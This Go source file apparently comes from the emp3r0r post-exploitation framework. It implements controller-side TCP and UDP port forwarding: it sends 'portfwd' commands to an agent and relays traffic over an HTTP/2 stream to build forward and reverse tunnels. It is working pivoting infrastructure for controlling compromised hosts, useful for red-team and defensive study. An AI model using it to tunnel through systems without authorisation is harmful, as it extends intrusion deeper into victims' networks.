package network

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// PortFwdSession holds controller interface of a port-fwd session
type PortFwdSession struct {
	Protocol    string       // TCP or UDP
	Lport       string       // listen_port
	To          string       // to address
	Description string       // fmt.Sprintf("%s (Local) -> %s (Agent)", listenPort, to_addr)
	Reverse     bool         // from agent to cc or cc to agent
	Listener    *net.UDPConn // if mapping is UDP, we need its listener
	Timeout     int          // timeout in seconds

	Agent       *def.Emp3r0rAgent                             // agent who holds this port mapping session
	SendCmdFunc func(string, string, *def.Emp3r0rAgent) error // send command to agent
	Sh          map[string]*StreamHandler                     // related to HTTP handler
	Ctx         context.Context                               // PortFwd context
	Cancel      context.CancelFunc                            // PortFwd cancel
}

// InitReversedPortFwd sends portfwd command to agent to set up a reverse port mapping.
func (pf *PortFwdSession) InitReversedPortFwd() (err error) {
	toAddr := pf.To
	listenPort := pf.Lport

	_, e2 := strconv.Atoi(listenPort)
	if !transport.ValidateIPPort(toAddr) || e2 != nil {
		return fmt.Errorf("invalid address/port: %s (to), %v (listen_port)", toAddr, e2)
	}

	fwdID := uuid.New().String()
	pf.Sh = nil
	if pf.Description == "" {
		pf.Description = "Reverse mapping"
	}
	pf.Reverse = true
	pf.Agent = live.ActiveAgent
	PortFwdsMutex.Lock()
	PortFwds[fwdID] = pf
	PortFwdsMutex.Unlock()

	cmd := fmt.Sprintf("%s --to %s --shID %s --operation reverse", def.C2CmdPortFwd, listenPort, fwdID)
	err = pf.SendCmdFunc(cmd, "", pf.Agent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	return
}

// RunReversedPortFwd exposes a service on CC side to agent via h2conn.
func (pf *PortFwdSession) RunReversedPortFwd(sh *StreamHandler) (err error) {
	conn, err := net.Dial("tcp", pf.To)
	if err != nil {
		logging.Warningf("RunReversedPortFwd failed to connect to %s: %v", pf.To, err)
		return
	}

	cleanup := func() {
		_, _ = conn.Write([]byte("exit\n"))
		conn.Close()
		sh.H2x.Conn.Close()
		logging.Debugf("PortFwd conn handler (%s) finished", conn.RemoteAddr().String())
		sh.H2x.Cancel()
	}

	pf.Agent = live.ActiveAgent
	pf.Reverse = true

	go func() {
		_, err = io.Copy(sh.H2x.Conn, conn)
		if err != nil {
			logging.Debugf("RunReversedPortFwd: conn -> h2: %v", err)
			return
		}
	}()
	go func() {
		_, err = io.Copy(conn, sh.H2x.Conn)
		if err != nil {
			logging.Debugf("RunReversedPortFwd: h2 -> conn: %v", err)
			return
		}
	}()

	defer cleanup()
	for sh.H2x.Ctx.Err() == nil {
		time.Sleep(500 * time.Millisecond)
	}
	return
}

// RunPortFwd forwards from ccPort to dstPort on agent via h2conn.
func (pf *PortFwdSession) RunPortFwd() (err error) {
	// ...existing code...
	if pf.Protocol == "" {
		pf.Protocol = "tcp"
	}

	handleTCPConn := func(conn net.Conn, fwdID string) {
		// ...existing code...
		var (
			err   error
			sh    *StreamHandler
			exist bool
		)

		for i := 0; i < 1e5; i++ {
			time.Sleep(time.Millisecond)
			sh, exist = pf.Sh[fwdID]
			if exist {
				break
			}
		}
		if !exist {
			err = errors.New("handlePerConn: timeout")
			return
		}

		cleanup := func() {
			_, _ = conn.Write([]byte("exit"))
			conn.Close()
			sh.H2x.Conn.Close()
			logging.Debugf("handlePerConn: %s finished", conn.RemoteAddr().String())
		}

		go func() {
			_, err = io.Copy(sh.H2x.Conn, conn)
			if err != nil {
				logging.Debugf("handlePerConn: conn -> h2: %v", err)
				return
			}
		}()
		_, err = io.Copy(conn, sh.H2x.Conn)
		if err != nil {
			logging.Debugf("handlePerConn: h2 -> conn: %v", err)
			return
		}
		defer cleanup()
	}

	ctx := pf.Ctx
	cancel := pf.Cancel
	toAddr := pf.To
	listenPort := pf.Lport

	pf.Agent = live.ActiveAgent

	_, e2 := strconv.Atoi(listenPort)
	if !transport.ValidateIPPort(toAddr) || e2 != nil {
		return fmt.Errorf("invalid address/port: %s (to), %v (listen_port)", toAddr, e2)
	}

	var (
		udp_listener    *net.UDPConn
		tcp_listener    net.Listener
		udp_listen_addr *net.UDPAddr
	)
	switch pf.Protocol {
	case "tcp":
		tcp_listener, err = net.Listen("tcp", ":"+listenPort)
		if err != nil {
			return fmt.Errorf("RunPortFwd listen TCP: %v", err)
		}
	case "udp":
		udp_listen_addr, err = net.ResolveUDPAddr("udp", ":"+listenPort)
		if err != nil {
			return fmt.Errorf("RunPortFwd resolve UDP address: %v", err)
		}
		udp_listener, err = net.ListenUDP("udp", udp_listen_addr)
		if err != nil {
			return fmt.Errorf("RunPortFwd Listen UDP: %v", err)
		}
		pf.Listener = udp_listener
	}

	fwdID := uuid.New().String()
	cmd := fmt.Sprintf("%s --to %s --shID %s --operation %s", def.C2CmdPortFwd, toAddr, fwdID, pf.Protocol)
	err = pf.SendCmdFunc(cmd, "", pf.Agent)
	if err != nil {
		return fmt.Errorf("SendCmd: %v", err)
	}
	logging.Debugf("RunPortFwd (%s: %s) %s: %s to %s\n%s",
		pf.Description, fwdID, pf.Protocol, pf.Lport, pf.To, cmd)

	pf.Sh = nil
	if pf.Description == "" {
		pf.Description = fmt.Sprintf("Agent to CC mapping (%s)", pf.Protocol)
	}
	PortFwdsMutex.Lock()
	PortFwds[fwdID] = pf
	PortFwdsMutex.Unlock()

	cleanup := func() {
		cancel()
		if tcp_listener != nil {
			tcp_listener.Close()
		}
		if udp_listener != nil {
			udp_listener.Close()
		}
		PortFwdsMutex.Lock()
		defer PortFwdsMutex.Unlock()
		delete(PortFwds, fwdID)
		logging.Warningf("PortFwd session (%s) has finished:\n%s: %s -> %s\n%s",
			pf.Description, pf.Protocol, pf.Lport, pf.To, fwdID)
	}

	go func() {
		for ctx.Err() == nil {
			time.Sleep(1 * time.Second)
		}
		_, _ = net.Dial(pf.Protocol, "127.0.0.1:"+listenPort)
	}()

	defer cleanup()

	handleUDPPacket := func() {
		buf := make([]byte, 1024)
		n, udp_client_addr, e := udp_listener.ReadFromUDP(buf)
		if e != nil {
			logging.Errorf("UDP Listener: %v", err)
			return
		}
		if n == 0 {
			return
		}
		client_tag := udp_client_addr.String()
		logging.Debugf("UDP listener read %d bytes from %s", n, udp_client_addr.String())

		shID := fmt.Sprintf("%s_%s-udp", fwdID, client_tag)
		cmd = fmt.Sprintf("%s --to %s --shID %s --operation %s --timeout %d",
			def.C2CmdPortFwd, toAddr, shID, pf.Protocol, pf.Timeout)
		err = pf.SendCmdFunc(cmd, "", pf.Agent)
		if err != nil {
			logging.Errorf("SendCmd: %v", err)
			return
		}

		var (
			sh    *StreamHandler
			exist bool
		)
		for i := 0; i < 10000; i++ {
			util.TakeABlink()
			sh, exist = pf.Sh[shID]
			if exist {
				break
			}
		}
		if !exist {
			err = fmt.Errorf("UDP forwarding: timeout waiting for agent connection: %s", udp_client_addr.String())
			return
		}

		buf = buf[0:n]
		n, err = sh.H2x.Conn.Write(buf)
		if err != nil {
			logging.Errorf("Write to H2: %v", err)
		}
		logging.Debugf("%s sent %d bytes to H2", udp_client_addr.String(), n)
	}

	for ctx.Err() == nil {
		p, exist := PortFwds[fwdID]
		if !exist {
			return
		}
		if p.Sh == nil {
			time.Sleep(100 * time.Millisecond)
			continue
		}

		switch pf.Protocol {
		case "udp":
			handleUDPPacket()
		case "tcp":
			conn, e := tcp_listener.Accept()
			if e != nil {
				logging.Errorf("Listening on port %s: %v", p.Lport, e)
			}
			srcPort := strings.Split(conn.RemoteAddr().String(), ":")[1]

			go func() {
				shID := fmt.Sprintf("%s_%s", fwdID, srcPort)
				cmd = fmt.Sprintf("%s --to %s --shID %s --operation %s --timeout %d",
					def.C2CmdPortFwd, toAddr, shID, pf.Protocol, pf.Timeout)
				err = pf.SendCmdFunc(cmd, "", pf.Agent)
				if err != nil {
					logging.Errorf("SendCmd: %v", err)
					return
				}
				handleTCPConn(conn, shID)
			}()
		}
	}

	return
}
